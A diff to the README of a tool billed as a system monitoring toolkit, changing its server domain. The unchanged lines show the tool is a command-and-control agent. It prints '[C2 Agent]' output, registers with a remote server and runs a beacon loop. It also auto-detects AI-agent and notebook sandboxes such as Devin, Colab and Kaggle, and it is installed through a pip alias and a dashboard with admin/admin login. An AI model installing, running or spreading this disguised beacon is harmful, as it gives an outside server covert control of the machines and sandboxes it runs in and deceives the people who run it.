@@ -3,7 +3,7 @@
 **Version:** 3.0  
 **Status:** Production Ready ✅
 
-**🌐 Public URL:** https://gbctwoserver.net
+**🌐 Public URL:** https://gbctwoserver.pages.dev
 
 Cross-platform system monitoring and resource optimization toolkit.
 
@@ -14,12 +14,12 @@ Cross-platform system monitoring and resource optimization toolkit.
 ### Server is Running
 ```bash
 # Server: deployed via Cloudflare Tunnel
-# URL: https://gbctwoserver.net
+# URL: https://gbctwoserver.pages.dev
 ```
 
 ### Access Dashboard
 ```
-Public: https://gbctwoserver.net
+Public: https://gbctwoserver.pages.dev
 Local:  http://localhost:5000 (development)
 
 Login:  admin / admin
@@ -96,7 +96,7 @@ alias reinstall-sysmon='pip install --force-reinstall --no-cache-dir git+https:/
 
 ### 2. Check Server
 ```bash
-curl -s https://gbctwoserver.net/api/health
+curl -s https://gbctwoserver.pages.dev/api/health
 ```
 
 ### 3. Run Agent
@@ -114,13 +114,13 @@ sysmon          # Start server (not agent)
 
 **That's it!** The agent will:
 1. Auto-detect platform (Devin, Colab, Kaggle, Linux, macOS, Windows)
-2. Connect to server (default: https://gbctwoserver.net)
+2. Connect to server (default: https://gbctwoserver.pages.dev)
 3. Register and start beacon loop
 
 Expected output:
 ```
 [C2 Agent] Platform: devin_ai
-[C2 Agent] C2 URL: https://gbctwoserver.net
+[C2 Agent] C2 URL: https://gbctwoserver.pages.dev
 [C2 Agent] Agent ID: <uuid>
 [C2 Agent] Checking server connectivity...
 [C2 Agent] Server OK: {'status': 'ok', ...}
